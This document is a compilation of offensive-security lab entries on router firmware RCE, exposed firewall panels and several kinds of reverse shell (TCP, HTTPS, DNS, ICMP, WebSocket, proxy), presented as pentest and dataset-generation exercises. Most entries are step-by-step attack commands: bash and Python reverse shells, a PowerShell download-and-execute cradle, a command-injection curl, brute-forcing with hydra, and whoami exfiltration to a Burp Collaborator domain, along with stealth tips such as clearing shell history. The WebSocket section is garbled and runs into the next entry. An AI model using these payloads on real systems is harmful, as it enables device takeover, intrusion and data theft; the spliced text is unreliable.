# AI/ML Security Attacks

## Firmware Vulnerability / RCE via Web Panel

- **Attack Type**: Remote Code Execution / Default Web Panel Access
- **Target**: Home RoutersIoT DevicesNAS DevicesFirewalls
- **Vulnerability**: Unpatched firmwareWeb admin panels with RCEDefault creds enabled
- **MITRE**: T1190 (Exploit Public-Facing App)T1040 (Network Sniffing)T1059 (Command and Scripting Interpreter)
- **Impact**: - Remote device takeover- Full shell access to deviceBackdoor installation- Network pivoting possible
- **Tools**: ✅ Kali Linux (Attacker)✅ OpenWRT / vulnerable router emulator✅ VirtualBox or GNS3 (to emulate)✅ nmap, searchsploit, msfconsole✅ Burp Suite (optional)✅ curl, nc, exploit-db CVEs✅ Wireshark / tcpdump (for packet capture)
- **Scenario**: This simulation shows how attackers exploit outdated or vulnerable firmware in network devices (routers, IP cams, NAS, etc.) with exposed web admin panels. Many such devices have hardcoded credentials, command injection flaws, or RCE bugs in older firmware. Attackers scan for the device, fingerprint the firmware, and then exploit known CVEs to get remote shell access. Great for building datasets, pentest demos, and awareness of why firmware patching is critical.
- **Attack Steps**: ### 🟢 STEP 1: Setup Lab – Vulnerable Web Panel DeviceOption A (Virtual):• Use OpenWRT image or firmware emulator like firmadyne, qemu, or vuln-netgear Docker imageOption B (Real device):• Use TP-Link / D-Link / Netgear router with old firmware (optional firmware downgrade)Router IP: 192.168.56.1Kali IP: 192.168.56.101---### 🟢 STEP 2: Discover Device + PanelScan open ports:nmap -p 80,443,8080 192.168.56.1Fingerprint service:nmap -sV -sC 192.168.56.1Visit in browser:http://192.168.56.1 → login panel appears---### 🟢 STEP 3: Try Default CredentialsTry logging in with common defaults:• admin:admin• admin:password• root:1234Use hydra if brute force needed:hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.1 http-get /login.php✅ Login success means panel is exposed & weak---### 🟢 STEP 4: Search for Known Firmware RCE ExploitsUse banner version to identify firmware:nmap --script http-title,http-server-header 192.168.56.1Then:searchsploit netgear or searchsploit d-linkExample CVE: CVE-2017-5521 (Netgear RCE bypass)---### 🟢 STEP 5: Launch RCE ExploitOption 1: Use curl-based command injection:curl "http://192.168.56.1/diagnostic.cgi?ping_ip=127.0.0.1;reboot"Option 2: Metasploit:msfconsoleuse exploit/linux/http/netgear_telnetenableset RHOSTS 192.168.56.1run✅ Router responds with reverse shell or telnet enabled---### 🟢 STEP 6: Reverse Shell Access (RCE Success)On Kali (listener):nc -nlvp 4444From device (via injection):bash -i >& /dev/tcp/192.168.56.101/4444 0>&1✅ Now you control the device remotely via shell---### 🟢 STEP 7: Generate PCAP DatasetStart capture:sudo tcpdump -i eth0 host 192.168.56.1 -w firmware_rce.pcapRepeat:• Login to panel• Launch exploit• Capture reverse shellOpen in Wireshark:Filters:• http.request.uri contains "ping_ip"• tcp.port == 4444---### 🛑 STEP 8: Cleanup• Kill listeners: CTRL+C• Reboot device• Delete PCAP: rm firmware_rce.pcap🧠 Tips:• Avoid running on real production routers• Always document firmware version & CVE• Some real firmware can be emulated via firmadyne, QEMU, or Docker images
- **Detection**: - Monitor admin panel access- Use IDS/IPS (Suricata, Snort)- Track firmware version change logs
- **Solution**: - Always update firmware- Disable WAN admin access- Change default creds- Use firewalls to block access to port 80/443 from WAN- Harden panel (SSL, ACLs)
- **Tags**: #FirmwareExploit #RCE #RouterHack #IoTHacking #CVEPentest #AdminPanel #PCAPDataset #Metasploit #RedTeamLab

## Firewall Admin Interface Open to WAN

- **Attack Type**: Unauthorized Remote Access / Takeover
- **Target**: FirewallsSOHO RoutersEnterprise VPN BoxesCloud-hosted Security Gateways
- **Vulnerability**: Admin panel reachable over WANWeak or default credentialsNo IP restriction / ACLs on management access
- **MITRE**: T1021.001 (Remote Services: Web Panel)T1133 (External Remote Services)T1565.001 (Network Service Hijack)
- **Impact**: - Complete firewall takeover- Rule modification- Backdoor NATs or shells- Full pivot into internal network
- **Tools**: ✅ Kali Linux (Attacker)✅ Public test VM with pfSense (or local with NAT+bridge mode)✅ nmap, shodan, hydra, msfconsole✅ Browser✅ Wireshark / tcpdump✅ iptables, curl, Burp Suite (optional)
- **Scenario**: This simulation demonstrates how attackers can scan public IP ranges for exposed firewall admin panels (pfSense, Fortinet, Cisco ASAs, SonicWall, etc.). If reachable and protected by weak or default credentials, attackers can log in remotely, modify firewall rules, disable protection, or create backdoors (NAT, port forward, shell listeners). Extremely common in small offices and SME setups with poor WAN ACL policies.
- **Attack Steps**: ### 🟢 STEP 1: Lab or Target SetupOption A – Public Test:• Use pfSense on a public cloud VPS (AWS/Linode/Vultr)• Allow WAN web GUI temporarily for testOption B – Local:• pfSense VM + Kali in NAT + Host-Only• Configure WAN port (e.g., 8080) to accept HTTP admin✅ Example:• Firewall WAN IP: 192.168.56.1 (or public IP)• Admin panel: http://192.168.56.1:8080---### 🟢 STEP 2: Scan for Exposed Web PanelRun basic scan:nmap -p 80,443,8080,8443 <target-IP>Try script scan:nmap -sV -sC <target-IP>If public:Use Shodan.ioSearch:http.title:"pfSense"http.title:"SonicWall"✅ You’ll find dozens of exposed admin panels!---### 🟢 STEP 3: Access the Web PanelIn browser:http://<IP>:8080 → admin loginTry default creds:• admin:pfsense• admin:admin• admin:passwordOr brute-force:hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-get /✅ Successful login = attacker controls the firewall!---### 🟢 STEP 4: Modify Firewall Rules1. Navigate to Firewall > Rules2. Add rule to allow attacker IP on SSH, RDP, etc.3. Add NAT forward to internal host:• Port 3389 → 192.168.56.10:3389• Port 4444 → Attacker listener✅ Now attacker can bypass internal protections---### 🟢 STEP 5: Setup Reverse ShellAttacker side (Kali):nc -nlvp 4444On internal host (if controlled):bash -i >& /dev/tcp/<attacker-IP>/4444 0>&1Or create port knock rule, or deploy backdoor user---### 🟢 STEP 6: Capture PCAP for DatasetStart packet capture:sudo tcpdump -i eth0 host <firewall-IP> -w fw_wan_rce.pcapRepeat:• Access panel• Login attempt• Rule modifications• NAT/backdoor setupOpen in Wireshark:Filters:• http.request.uri contains "firewall"• tcp.port == 8080---### 🛑 STEP 7: Cleanup• Delete backdoor NAT rules• Disable WAN access to GUI• Remove temp users created• Reboot or restore config🧠 Tips:• pfSense often uses /status.php and /diag_ping.php — common RCE injection points• Add “Allow Any” rule temporarily for testing, remove afterward• Document all steps for final report
- **Detection**: - Monitor login attempts- Audit firewall config regularly- Look for unusual NAT/rule entries- Use IDS on WAN side
- **Solution**: - Block WAN access to admin ports- Use management from LAN only- Enforce ACLs or VPN-only access- Change default creds- Enable 2FA where possible
- **Tags**: #FirewallHack #WANPanel #RemoteAdminRCE #RedTeam #pfSense #RouterExploit #PCAPReady #DatasetGen #RuleBypass #ACLWeakness

## Basic TCP Reverse Shell

- **Attack Type**: Remote Shell / Command Execution
- **Target**: WorkstationsVMsIoT DevicesCloud VMs
- **Vulnerability**: Open socket accessRemote executionImproper egress filtering
- **MITRE**: T1059 (Command and Scripting Interpreter)T1071 (Application Layer Protocol)T1021 (Remote Services)
- **Impact**: - Remote shell access- System compromise- Data theft- Pivot to internal network
- **Tools**: ✅ Kali Linux (Attacker) ✅ Windows 10 or Ubuntu VM (Victim) ✅ nc (Netcat) ✅ bash (on Linux target) or Python✅ VirtualBox or VMware✅ Wireshark (to capture reverse shell traffic)
- **Scenario**: This simulation demonstrates how attackers create a basic reverse shell using TCP. A reverse shell allows the target machine (victim) to connect back to the attacker's machine, giving the attacker command-line access. It's often used when the victim is behind NAT/firewall and can't accept incoming connections. Great for learning socket-based exploitation, Pentest labs, or PCAP dataset generation for intrusion detection.
- **Attack Steps**: ### 🟢 STEP 1: Lab Setup• Open Kali Linux VM (attacker)• Open Victim VM (Windows/Linux)• Ensure both are on same internal network or NAT• Check IPs: Kali (attacker): 192.168.56.101 Victim: 192.168.56.102✅ Both machines must be reachableTest with:ping 192.168.56.102 from Kali---### 🟢 STEP 2: Start Listener on Attacker (Kali)• Open terminal in Kali• Run:nc -nlvp 4444✅ This waits for the victim to connectBreakdown:n → no DNSl → listen modev → verbose outputp 4444 → port number---### 🟢 STEP 3: Craft Reverse Shell on Victim➡️ For Linux victim, run:bash -i >& /dev/tcp/192.168.56.101/4444 0>&1Explanation:• bash -i: interactive shell• /dev/tcp/: uses built-in TCP socket• 192.168.56.101: attacker's IP• 4444: port used by nc• 0>&1: redirects input/output➡️ For Windows victim, use Python reverse shell:python<br>import socket,subprocess,os<br>s=socket.socket()<br>s.connect(("192.168.56.101",4444))<br>os.dup2(s.fileno(),0)<br>os.dup2(s.fileno(),1)<br>os.dup2(s.fileno(),2)<br>subprocess.call(["cmd.exe"])<br>Save as rev.py and run:python rev.py✅ Victim connects back to Kali listener---### 🟢 STEP 4: Get Shell AccessOn Kali listener (already running):✅ You will now see:Connection received on 192.168.56.102Type commands like:whoami → check userhostname → machine nameip a → IP info✅ This is a live shell, not a fake---### 🟢 STEP 5: Capture Network PCAPOpen Wireshark on KaliSelect interface: eth0 or ens33Apply filter:tcp.port == 4444Start capture → then launch reverse shell✅ You’ll capture TCP handshake + shell communicationStop capture and save as rev_shell.pcap---### 🟢 STEP 6: Analyze Traffic (Optional)In Wireshark:• Follow TCP Stream• You’ll see commands & output• Red teamers use this to demo covert channels---### 🛑 STEP 7: Cleanup Lab• Stop listener: CTRL+C• Close victim shell• Delete pcap: rm rev_shell.pcap• Disconnect VMs from network if needed🧠 Tips:• You can automate this with payloads• Avoid running this outside a lab (firewalls will block it)• Try other payload formats (e.g. MSFvenom, PowerShell, base64 encoding)
- **Detection**: - Monitor unusual TCP outbound connections- Check for bash, Python spawning from user sessions- IDS/IPS detection using PCAP signatures
- **Solution**: - Block outbound TCP to unknown IPs- Use EDR to track suspicious scripts- Disable bash reverse shell vectors- Use firewalls with egress rules
- **Tags**: #ReverseShell #TCPExploit #RedTeam #BashShell #PythonShell #Pentest #PCAP #Netcat

## HTTP/HTTPS Reverse Shell (Firewall Evasion)

- **Attack Type**: Covert Reverse Shell / Evasion via Web Protocols
- **Target**: WorkstationsCloud VMsCorporate Users Behind Firewalls
- **Vulnerability**: Lack of Egress FilteringOverly trusted HTTP/HTTPS trafficScript Execution Allowed
- **MITRE**: T1071.001 (Application Layer Protocol: Web Protocols)T1059 (Command and Scripting Interpreter)T1090 (Proxy)
- **Impact**: - Full system compromise via trusted ports- Bypass of firewall rules- Covert channel for data exfiltration or RAT
- **Tools**: ✅ Kali Linux (Attacker)✅ Windows 10 or Ubuntu (Victim)✅ msfconsole, Veil, Python, ngrok✅ Burp Suite (for request capture)✅ wireshark / tcpdump✅ Internet (or fake HTTPS via self-signed certs)✅ Optional: Apache server (apache2)
- **Scenario**: This simulation shows how attackers use HTTP/HTTPS as a covert transport channel to establish a reverse shell from a victim behind a strict firewall. Since HTTP/HTTPS are allowed by most networks for web traffic, attackers encapsulate shell commands in HTTP requests or leverage tools like web_delivery or Meterpreter over HTTPS to bypass outbound rules and IDS. Perfect for training on covert channel detection, red teaming, or dataset generation for evasive traffic.
- **Attack Steps**: ### 🟢 STEP 1: Prepare Attacker (Kali)Open terminal:bash<br>msfconsole<br>Then load reverse shell module:bash<br>use exploit/multi/script/web_delivery<br>set PAYLOAD windows/meterpreter/reverse_https<br>set SRVHOST 0.0.0.0<br>set LHOST <your Kali IP or ngrok URL><br>set LPORT 443<br>exploit<br>✅ This creates an HTTP(S) server that hosts a malicious script✅ When the victim runs this script, they connect back over HTTPS (covert)---### 🟢 STEP 2: Setup HTTPS Tunnel with Ngrok (Optional but Recommended)If victim is on internet, use ngrok:bash<br>./ngrok http 443<br>Copy the HTTPS URL (e.g., https://abcd1234.ngrok.io)Then in msfconsole, update:set LHOST abcd1234.ngrok.io---### 🟢 STEP 3: Generate Payload (Auto or Manual)You’ll see output like:powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>:<PORT>/random.ps1')"Copy this payload➡️ On victim machine, open PowerShell (as user)Paste and run the command:✅ The script silently connects to attacker's server using HTTPS---### 🟢 STEP 4: Receive Meterpreter Session (On Kali)✅ After victim runs the command, in msfconsole, you’ll see:[*] Sending stage (175174 bytes)[*] Meterpreter session 1 openedInteract:sessions -i 1Now you can run:sysinfo, getuid, shell, screenshot, hashdump, etc.---### 🟢 STEP 5: Verify Evasion SuccessOpen Wireshark or tcpdump:Filter:tcp.port == 443✅ Traffic looks like regular HTTPS✅ No obvious shell commands in plain text---### 🟢 STEP 6: Test Against Firewall (Egress Filtering Bypass)On victim machine, block all ports except 80 and 443 (simulate firewall):In Windows Defender or iptables:sudo iptables -P OUTPUT DROPsudo iptables -A OUTPUT -p tcp --dport 443 -j ACCEPTRe-run payload → still works ✅---### 🛑 STEP 7: Cleanup Lab• On Kali: CTRL+C in msfconsole• On victim: close PowerShell, kill connection• Delete payload script (if saved)• Clear ngrok logs or stop the tunnel• Remove Wireshark PCAP: rm https_reverse.pcap🧠 Tips:• Try self-signed certs with openssl if not using ngrok• Use Burp Suite to observe encoded HTTPS traffic• Combine with browser user-agent spoofing for better stealth
- **Detection**: - Monitor outbound HTTPS connections to unknown IPs- Use SSL interception with proxy- Analyze PCAPs for high-frequency callbacks or PowerShell URLs
- **Solution**: - Use egress filtering (only allow known IPs over 443)- Disable PowerShell web calls in endpoint policies- Inspect TLS traffic using proxy (e.g., Zscaler, Bluecoat)- Train detection on beacon behavior, not just ports
- **Tags**: #HTTPSReverseShell #CovertShell #FirewallBypass #MeterpreterHTTPS #PowerShellPayload #NgrokTunnel #RedTeam #C2OverWeb

## DNS Reverse Shell (Covert Channel)

- **Attack Type**: Reverse Shell via DNS Tunneling / Covert Channel
- **Target**: Corporate workstationsMobile DevicesCloud or Dev serversRemote VMs
- **Vulnerability**: Overly permissive DNS egressLack of DNS inspectionScript execution allowed
- **MITRE**: T1071.004 (Application Layer Protocol: DNS)T1048 (Exfiltration Over Alternative Protocol)T1059 (Command and Scripting Interpreter)
- **Impact**: - Covert command execution- Firewall bypass- Undetectable backdoor channel- Full system compromise possible
- **Tools**: ✅ Kali Linux (Attacker)✅ Ubuntu/Windows (Victim)✅ iodine, dnscat2, or dnscapy✅ Burp Suite (for traffic inspection)✅ Wireshark / tcpdump✅ Real or emulated domain + DNS server✅ Optional: DNS server (Bind9, DNSChef)
- **Scenario**: This simulation demonstrates how attackers use DNS as a covert channel to establish a reverse shell. In many corporate networks, DNS is one of the few protocols allowed outbound, even when other traffic (like TCP/HTTP) is filtered. Attackers exploit this by encoding shell commands/responses inside DNS queries and responses. It’s useful for bypassing egress firewalls, long-term persistence, and red teaming. This also helps generate realistic IDS datasets for detecting data exfiltration via DNS.
- **Attack Steps**: ### 🟢 STEP 1: Setup Attacker DNS C2 Server (Kali)Tool: dnscat2-serverInstall:bash<br>git clone https://github.com/iagox86/dnscat2.git<br>cd dnscat2/server<br>gem install bundler && bundle install<br>./dnscat2.rb<br>✅ This will create a DNS server ready to handle covert communicationYou'll see output: Listening on port 53 for incoming connections...---### 🟢 STEP 2: Register or Emulate Domain for C2➡️ Real domain method:• Buy a cheap domain (e.g., GoDaddy, Namecheap)• Point NS record to your Kali IP (e.g., ns1.attacker.com → 192.168.56.101)➡️ Offline test method:• Use dnschef or bind9 to simulate DNS traffic✅ Domain like shell.attacker.com now resolves via attacker’s DNS---### 🟢 STEP 3: Setup Victim Machine with DNS ClientOn Windows/Ubuntu victim, download dnscat2 client:bash<br>git clone https://github.com/iagox86/dnscat2.git<br>cd dnscat2/client<br>make<br>Launch client:bash<br>./dnscat --dns server=shell.attacker.com,port=53<br>✅ This sends DNS queries to your attacker-controlled server---### 🟢 STEP 4: Receive Shell on AttackerOn Kali (dnscat2 server), once victim connects:✅ You’ll see:New session started from 192.168.56.102Now type:sessions → see active sessionssession -i 1 → interact with victimRun shell commands like:whoami, ipconfig, hostname, etc.✅ These commands get encoded and sent via DNS TXT records---### 🟢 STEP 5: Observe DNS as Covert ChannelOpen Wireshark on attackerFilter:dns && ip.addr == 192.168.56.102✅ You’ll see frequent DNS queries to abcd.shell.attacker.com✅ TXT responses contain base64 or hex output from victim---### 🟢 STEP 6: Test Firewall EvasionSimulate strict egress filtering:On victim:• Block all outbound TCP except DNS• Use Windows Defender or iptables:bash<br>sudo iptables -P OUTPUT DROP<br>sudo iptables -A OUTPUT -p udp --dport 53 -j ACCEPT<br>✅ Despite firewall, reverse shell over DNS still works---### 🛑 STEP 7: Cleanup• CTRL+C dnscat2 server• Close dnscat client• Remove logs: rm -rf dnscat2*• Revert DNS NS settings if real domain used• Remove PCAP from Wireshark: rm dns_reverse.pcap🧠 Tips:• Use dnscapy or iodine for alternative DNS payloads• Encrypt payloads inside DNS (AES)• Combine with scheduled tasks or persistence scripts for long-term C2
- **Detection**: - Monitor DNS traffic frequency and entropy- Look for excessive TXT records- Use Suricata/Snort DNS tunneling rules- Analyze domain resolution patterns
- **Solution**: - Enforce egress filtering for DNS- Use internal DNS forwarders- Inspect DNS with Deep Packet Inspection (DPI)- Detect and alert on long/encoded subdomains
- **Tags**: #DNSReverseShell #Tunneling #FirewallBypass #CovertChannel #dnscat2 #DNSC2 #IDSdataset #RedTeam

## ICMP Reverse Shell (Ping Shell)

- **Attack Type**: Covert Reverse Shell / Firewall Evasion via ICMP
- **Target**: WorkstationsIoT DevicesFirewalled VMsCloud endpoints
- **Vulnerability**: Firewall allows ICMPNo DPI or payload inspectionLack of egress rules
- **MITRE**: T1095 (Non-Application Layer Protocol)T1048 (Exfiltration Over Alternative Protocol)T1059 (Command and Scripting Interpreter)
- **Impact**: - Covert shell bypasses firewalls- No TCP connection = stealthier- System control using only ICMP- Great for stealth C2
- **Tools**: ✅ Kali Linux (Attacker)✅ Ubuntu or Windows (Victim)✅ icmp_shell.py or Ptunnel✅ Python 3.x✅ Wireshark / tcpdump✅ Optional: Firewall or egress filter for testing✅ Visual Studio Code (optional for editing shell scripts)
- **Scenario**: This simulation demonstrates how attackers use ICMP (ping packets) to build a covert reverse shell channel. Since ICMP is usually allowed by firewalls for network diagnostics, attackers exploit this protocol to send commands and receive output hidden inside ICMP Echo/Reply payloads. This makes it hard to detect with normal IDS. It’s perfect for building a realistic dataset, training blue teams, or showing how ICMP can be abused for C2 when everything else is blocked.
- **Attack Steps**: ### 🟢 STEP 1: Setup Lab Environment• Use Kali Linux VM (attacker)• Use Ubuntu or Windows 10 VM (victim)• Put both VMs in same network (NAT/Bridged/Internal)➡️ Find IPs:• Kali IP: 192.168.56.101• Victim IP: 192.168.56.102✅ Confirm connectivity:ping 192.168.56.102 from Kali → you should get replies---### 🟢 STEP 2: Download ICMP Shell ToolWe’ll use a Python script that hides shell commands in ping packets.On both machines, run:bash<br>git clone https://github.com/inquisb/icmpsh.git<br>cd icmpsh<br>This gives you:- icmpsh_m.py → master (attacker)- icmpsh_s.py → slave (victim shell sender)✅ Use Python 3.x (recommended)---### 🟢 STEP 3: Start ICMP Shell Listener (Kali – Attacker)In Kali, run:bash<br>sudo python3 icmpsh_m.py 192.168.56.101 192.168.56.102<br>Arguments:• First IP: Kali’s own IP (listener)• Second IP: Victim’s IP (who will send ICMP)✅ This listens for ICMP echo reply packets---### 🟢 STEP 4: Run ICMP Shell on VictimOn Victim, open terminal:bash<br>sudo python3 icmpsh_s.py 192.168.56.101<br>Arguments:• Kali IP (where to send ICMP replies)✅ Now, victim sends encoded shell output in ICMP Echo Replies---### 🟢 STEP 5: Use Reverse Shell over ICMPBack on Kali shell (where icmpsh_m.py is running):Type shell commands like:whoami, hostname, uname -a, cat /etc/passwd✅ The victim will receive and execute these commands, and reply via ICMP✅ Entire traffic goes via Ping packets!---### 🟢 STEP 6: Observe Traffic in WiresharkOpen Wireshark on Kali:Filter:icmp && ip.addr == 192.168.56.102✅ You’ll see:• ICMP Echo Requests from Kali → commands• ICMP Echo Replies from Victim → outputsPayloads are hex/base64 encoded command responses✅ This is a stealthy, covert shell using Ping!---### 🟢 STEP 7: Simulate Firewall Rules (Optional)Block all traffic except ICMPOn victim machine:bash<br>sudo iptables -P OUTPUT DROP<br>sudo iptables -A OUTPUT -p icmp -j ACCEPT<br>Try running other reverse shells (TCP, HTTP) → they’ll fail ❌✅ Only ICMP shell works 🟢---### 🛑 STEP 8: Cleanup + PCAP• On Kali: CTRL+C to stop shell• On victim: CTRL+C to exit sender• Delete tools: rm -rf icmpsh• Save PCAP from Wireshark as icmp_reverse.pcap🧠 Tips:• Try replacing ICMP payload encoding with XOR, AES for stealth• Create PCAP-based datasets for detecting ICMP shell• Use dnstap, Zeek, Suricata rules for future analysis
- **Detection**: - Analyze ICMP traffic payload size/patterns- Detect consistent pings from hosts- Use IDS with ICMP inspection (Suricata, Zeek)- PCAP analysis with filters on ICMP payloads
- **Solution**: - Block outbound ICMP if not required- Inspect ICMP payloads for patterns- Enforce egress firewalls- Use behavior-based detection models- Disable script execution or alert on abnormal ICMP frequency
- **Tags**: #ICMPReverseShell #PingShell #FirewallEvasion #ICMPExploit #RedTeam #PythonShell #PacketCovert #Dataset #PCAP

## WebSocket Reverse Shell (Web Bypass)

- **Attack Type**: Reverse Shell via WebSockets (Firewall Evasion Method)
- **Target**: BrowsersCorporate desktopsIoT dashboardsFirewall-restricted servers
- **Vulnerability**: Over-trusted WebSocket trafficPorts 80/443/8080 openNo protocol inspectionScript execution
- **MITRE**: T1071.001 (Web Protocol)T1043 (Commonly Used Port)T1059 (Command and Scripting Interpreter)T1571 (Non-Standard Port)
- **Impact**: - Covert shell access over Web protocols- Evades many firewalls and IDS- Can be disguised as chat/JS app traffic
- **Tools**: ✅ Kali Linux (Attacker)✅ Ubuntu or Windows (Victim)✅ Python 3.x✅ websocket-client (Python)✅ websocat or custom WS server✅ Wireshark or tcpdump✅ Optional: Ngrok for public wss:// tunneling
- **Scenario**: This simulation shows how attackers use WebSockets, a protocol designed for real-time web communication, to create a reverse shell over port 80/443, bypassing many firewalls and egress filters. Because WebSockets are often allowed in corporate networks for chat, dashboards, or apps, they can be used covertly as C2 channels. This is useful for red teaming, stealth command/control, and dataset creation for detecting WebSocket misuse. You’ll simulate both attacker & victim, observe the channel in Wireshark, and optionally use encrypted wss:// for stealth.
- **Attack Steps**: ### 🟢 STEP 1: Lab Setup (Same Network)• Kali Linux VM → Attacker• Ubuntu/Windows VM → Victim➡️ Both machines must be in the same NAT or bridged network➡️ Confirm IPs:• Kali: 192.168.56.101• Victim: 192.168.56.102Test ping:bash<br>ping 192.168.56.102<br>---### 🟢 STEP 2: Start WebSocket Server (Attacker Side)On Kali, install:bash<br>pip install websockets asyncio<br>Create file ws_server.py:python<br>import asyncio, websockets, subprocess<br>async def shell(websocket, path):<br> while True:<br> cmd = await websocket.recv()<br> proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)<br> output, error = proc.communicate()<br> await websocket.send(output.decode() + error.decode())<br>start_server = websockets.serve(shell, '0.0.0.0', 8080)<br>asyncio.get_event_loop().run_until_complete(start_server)<br>asyncio.get_event_loop().run_forever()<br>Run it:bash<br>python3 ws_server.py<br>✅ Now Kali listens for WebSocket shell connections on port 8080---### 🟢 STEP 3: Launch WebSocket Client (Victim Side)Install Python module:bash<br>pip install websocket-client<br>Create ws_client.py:python<br>import websocket, os<br>def on_message(ws, msg):<br> output = os.popen(msg).read()<br> ws.send(output)<br>ws = websocket.WebSocketApp("ws://192.168.56.101:8080", on_message=on_message)<br>ws.run_forever()<br>Run on victim:bash<br>python3 ws_client.py<br>✅ This connects back to Kali and waits for shell commands---### 🟢 STEP 4: Use WebSocket Reverse ShellOn Kali (in terminal or update script):Send commands via the server terminal:• whoami• ipconfig or ifconfig• hostnameVictim executes and sends result via WebSocket frame back✅ You now have a reverse shell over WebSocket protocol---### 🟢 STEP 5: Observe in Wireshark (Optional)Open Wireshark on Kali:Filter:bash<br>tcp.port == 8080<br>• Inspect websocket upgrade headers• Use "Follow TCP Stream" to see shell commands & outputs✅ Everything runs over allowed "ws://192.168.56.101:8080" in ws_client.py with wss://abc.ngrok.io✅ Now traffic is encrypted and mimics HTTPS completely---### 🛑 STEP 7: Cleanup• Stop both ws_server.py and ws_client.py using CTRL+C• Delete scripts: rm ws_*.py• End ngrok tunnel (if used)• Save Wireshark PCAP as ws_shell.pcap🧠 Tips:• You can base64-encode commands for stealth• You can turn this into a web-based JS payload inside a ## Reverse Shell over Proxy (Burp Collaborator)

- **Attack Type**: Reverse Shell tunneled via Proxy / Burp C2 Service
- **Target**: Internal machinesProxied devicesBrowsers and web clientsCorporate endpoints

- **Scenario**: This simulation demonstrates how attackers use proxy-based reverse shells with tools like Burp Collaborator, public HTTP/S proxies, or tunneling services like Ngrok, to bypass strict outbound firewall rules. These techniques are used when the victim cannot connect directly to the attacker (e.g., due to NAT or proxy restrictions), so the shell traffic is routed through proxy domains. This is commonly seen in APT red teaming, cloud exfiltration, or evading IP-based filtering. In this lab, you'll simulate this technique using Burp Collaborator and bash, with optional DNS-based callbacks. Great for dataset generation and threat detection testing.
- **Attack Steps**: ### 🟢 STEP 1: Set Up Lab MachinesAttacker: Kali LinuxVictim: Windows or Ubuntu VM➡️ Both VMs must be on the same NAT or Bridged network➡️ Find IPs:• Kali IP: 192.168.56.101• Victim IP: 192.168.56.102✅ Test connection:bash<br>ping 192.168.56.101<br>✅ Open Wireshark on Kali: sudo wireshark → Start capturing eth0---### 🟢 STEP 2: Enable Burp Collaborator Listener (Kali)1. Open Burp Suite Pro2. Go to Burp Collaborator Client3. Click “Copy Collaborator Payload”✅ Example: z8xu4zq0f5xyyb7cv12r9cq9p.burpcollaborator.net⚠️ This domain logs DNS, HTTP, and HTTPS interactions (used as C2 callback)---### 🟢 STEP 3: Craft Reverse Shell Payload (Victim Side)💻 On victim machine:✅ Open any terminal or PowerShellOption A – using curl and Burp:bash<br>curl http://z8xu4zq0f5xyyb7cv12r9cq9p.burpcollaborator.net/ping?data=$(whoami)<br>✅ This leaks the username via HTTP GET to CollaboratorOption B – using DNS:bash<br>nslookup $(whoami).z8xu4zq0f5xyyb7cv12r9cq9p.burpcollaborator.net<br>✅ This triggers DNS log on CollaboratorNow go to Burp > Collaborator Client > Poll Now✅ You will see DNS/HTTP callback logs, with timestamps and metadata---### 🟢 STEP 4: Reverse Shell Over Proxy (Manual Bash Payload)On victim:bash<br>bash -c 'bash -i >& /dev/tcp/z8xu4zq0f5xyyb7cv12r9cq9p.burpcollaborator.net/443 0>&1'<br>⚠️ Since this won’t directly work without listener, use Ngrok or public proxy instead:---### 🟢 STEP 5: Setup Ngrok Reverse Shell Tunnel (Attacker Side)1. On Kali, install & run:bash<br>./ngrok tcp 4444<br>✅ Ngrok gives public TCP URL: tcp://2.tcp.ngrok.io:128392. Start netcat listener:bash<br>nc -nlvp 4444<br>3. On victim, run shell using proxychains:bash<br>proxychains bash -i >& /dev/tcp/2.tcp.ngrok.io/12839 0>&1<br>✅ This gives a full reverse shell tunneled via proxy to Ngrok---### 🟢 STEP 6: Monitor Traffic (Kali Wireshark + Burp)• In Wireshark, filter:http or dns or tcp.port == 4444• In Burp, monitor Collaborator logs✅ Look for shell commands, DNS resolution, and HTTP GETs---### 🟢 STEP 7: Capture & Label DatasetIn Wireshark:1. Save capture: File > Save As → reverse_shell_proxy.pcap2. Label events:• DNS leak → Label: dns_callback• curl GET → Label: http_exfil• netcat tunnel → Label: proxy_shell✅ You now have labeled PCAP for ML / detection model---### 🛑 STEP 8: Cleanup• CTRL+C all terminals• Stop Ngrok• Clear Burp Collaborator• Delete bash history (optional): history -c• Delete temp shell script or payloads🧠 Tips:• Replace IPs with real C2 for red team• Use XOR/base64 encode in URLs for stealth• Log DNS TTL, subdomain length, and HTTP URI length to train ML model
- **Detection**: - Monitor DNS/HTTP entropy- Detect unusual domain queries- Analyze Collaborator-like domain resolution- Suricata rules for proxy tunneling
- **Solution**: - Block unknown external proxies- Disable external DNS resolution for internal hosts- Monitor long/encoded subdomains- Inspect HTTP headers for shell payloads

## RA Flood Attack (Router Advertisement Flooding)

- **Attack Type**: IPv6 DoS / Network Disruption via ICMPv6 RA
- **Target**: Switch-based LANsCorporate IPv6 networksAny SLAAC-enabled endpoint
- **Vulnerability**: IPv6 enabled and SLAAC trustedNo RA Guard or port security enabled
- **MITRE**: T1498.002 (Network Denial of Service: Protocol Flood)
- **Impact**: - Network slowdown- Routing chaos- Internet access failure- Potential lateral movement via spoofed gateway
- **Tools**: ✅ Kali Linux (Attacker)✅ Victim machine (Windows/Linux)✅ THC-IPv6 Toolkit (includes flood_router26)✅ Wireshark✅ Ethernet/NAT network mode in VM✅ Optional: Suricata, Zeek for monitoring
- **Scenario**: In this attack, an attacker floods the local network with IPv6 Router Advertisement (RA) packets, causing victim machines to auto-configure bogus routes, assign many IPv6 addresses, or change gateways. This leads to DoS (Denial of Service), network slowdown, or gateway hijacking. This attack abuses the IPv6 stateless address autoconfiguration (SLAAC) mechanism. It’s dangerous because most devices accept RAs by default, and it works even if IPv4 is in use. You’ll simulate this with flood_router26 from the THC-IPv6 toolkit. Best for testing LAN security, switch config, and traffic-based anomaly detection datasets.
